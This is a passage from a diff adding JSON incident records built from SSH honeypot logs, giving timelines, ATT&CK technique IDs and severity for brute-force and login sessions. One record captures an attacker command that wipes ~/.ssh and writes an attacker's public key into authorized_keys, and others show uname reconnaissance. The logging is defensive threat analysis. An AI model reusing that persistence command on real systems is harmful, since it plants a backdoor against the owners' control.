+        {
+          "timestamp": "2026-03-11T18:28:26.710062Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:27.726191Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-37ede6ab9e38",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:28:48.281200Z",
+      "last_seen": "2026-03-11T18:28:49.357478Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:28:48.281200Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:48.281901Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:48.296220Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:48.341354Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:49.357478Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f68325de4103",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:29:09.357266Z",
+      "last_seen": "2026-03-11T18:29:10.433068Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:29:09.357266Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:09.357977Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:09.371974Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:09.416614Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:10.433068Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-8498a202c33a",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:29:30.097979Z",
+      "last_seen": "2026-03-11T18:29:31.175982Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:29:30.097979Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:30.098644Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:30.113306Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:30.158033Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:31.175982Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-15f54a74a2df",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:29:51.273360Z",
+      "last_seen": "2026-03-11T18:29:52.351280Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:29:51.273360Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:51.274073Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:51.288254Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:51.335335Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:29:52.351280Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-a13fd74ae17f",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:30:16.185051Z",
+      "last_seen": "2026-03-11T18:30:17.260027Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:30:16.185051Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:16.185691Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:16.199651Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:16.244113Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:17.260027Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-e315849f5b64",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:30:50.128285Z",
+      "last_seen": "2026-03-11T18:30:51.204071Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:30:50.128285Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:50.129157Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:50.143359Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:50.188113Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:51.204071Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-dcd3a2d9a2d7",
+      "src_ip": "101.36.127.212",
+      "first_seen": "2026-03-11T18:30:59.042839Z",
+      "last_seen": "2026-03-11T18:31:02.477542Z",
+      "duration_seconds": 3,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "downloads": [
+        {
+          "url": "",
+          "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
+        }
+      ],
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1105",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:30:59.042839Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.043491Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.135101Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.543431Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.781852Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.782366Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.783277Z",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:30:59.876173Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.079992Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.080461Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.181635Z",
+          "event": "cowrie.session.file_download"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.182271Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:02.477542Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1e7d77aa8af3",
+      "src_ip": "101.36.127.212",
+      "first_seen": "2026-03-11T18:31:00.261330Z",
+      "last_seen": "2026-03-11T18:31:01.824167Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:31:00.261330Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.263205Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.349392Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:00.734953Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:01.824167Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-a2c1bc06dc46",
+      "src_ip": "101.36.127.212",
+      "first_seen": "2026-03-11T18:31:01.909827Z",
+      "last_seen": "2026-03-11T18:31:02.472435Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:31:01.909827Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:01.910454Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:01.997621Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:02.384976Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:02.472435Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-bf937aa3d05f",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:31:24.038923Z",
+      "last_seen": "2026-03-11T18:31:25.117442Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:31:24.038923Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:24.039593Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:24.053981Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:24.101350Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:25.117442Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-07822d5caee3",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:31:58.216814Z",
+      "last_seen": "2026-03-11T18:31:59.293106Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:31:58.216814Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:58.217455Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:58.231488Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:58.276888Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:31:59.293106Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-6299c646c747",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:32:32.257222Z",
+      "last_seen": "2026-03-11T18:32:33.332858Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:32:32.257222Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:32:32.257907Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:32:32.272005Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:32:32.316581Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:32:33.332858Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-5c43161a4401",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:33:06.823535Z",
+      "last_seen": "2026-03-11T18:33:06.993630Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:33:06.823535Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.824221Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.838592Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.884390Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.976428Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.976929Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.992598Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:06.993630Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-d39522f10093",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:33:42.382004Z",
+      "last_seen": "2026-03-11T18:33:42.505436Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:33:42.382004Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.382691Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.397037Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.442022Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.488532Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.489024Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.504395Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T18:33:42.505436Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1044f51d01ba",
+      "src_ip": "162.142.125.114",
+      "first_seen": "2026-03-11T18:34:50.812039Z",
+      "last_seen": "2026-03-11T18:35:06.271835Z",
+      "duration_seconds": 15,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:34:50.812039Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:06.271835Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-d53b52ab74f8",
+      "src_ip": "162.142.125.192",
+      "first_seen": "2026-03-11T18:35:07.877270Z",
+      "last_seen": "2026-03-11T18:35:23.139448Z",
+      "duration_seconds": 15,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:07.877270Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:23.139448Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-3b0013fe9866",
+      "src_ip": "162.142.125.114",
+      "first_seen": "2026-03-11T18:35:11.377121Z",
+      "last_seen": "2026-03-11T18:35:14.438838Z",
+      "duration_seconds": 3,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:11.377121Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:14.438838Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-553a6606154c",
+      "src_ip": "206.168.34.58",
+      "first_seen": "2026-03-11T18:35:11.826265Z",
+      "last_seen": "2026-03-11T18:35:27.186834Z",
+      "duration_seconds": 15,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:11.826265Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:27.186834Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-7d58d18f2ac9",
+      "src_ip": "162.142.125.114",
+      "first_seen": "2026-03-11T18:35:20.961004Z",
+      "last_seen": "2026-03-11T18:35:31.309040Z",
+      "duration_seconds": 10,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:20.961004Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:31.309040Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-71427cd8000a",
+      "src_ip": "162.142.125.192",
+      "first_seen": "2026-03-11T18:35:26.544557Z",
+      "last_seen": "2026-03-11T18:35:29.988509Z",
+      "duration_seconds": 3,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:26.544557Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:29.988509Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-e2458bf6312f",
+      "src_ip": "162.142.125.192",
+      "first_seen": "2026-03-11T18:35:33.407234Z",
+      "last_seen": "2026-03-11T18:35:43.788393Z",
+      "duration_seconds": 10,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:33.407234Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:43.788393Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-137a5656324c",
+      "src_ip": "206.168.34.58",
+      "first_seen": "2026-03-11T18:35:49.866367Z",
+      "last_seen": "2026-03-11T18:35:53.274836Z",
+      "duration_seconds": 3,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:49.866367Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:35:53.274836Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-a4a0fd090cc0",
+      "src_ip": "206.168.34.58",
+      "first_seen": "2026-03-11T18:35:59.721518Z",
+      "last_seen": "2026-03-11T18:36:10.453867Z",
+      "duration_seconds": 10,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:35:59.721518Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:36:10.453867Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-9cd9bffef852",
+      "src_ip": "64.236.141.211",
+      "first_seen": "2026-03-11T18:51:21.593414Z",
+      "last_seen": "2026-03-11T18:51:21.594410Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:51:21.593414Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:51:21.594410Z",
           "event": "cowrie.session.closed"
         }
       ]
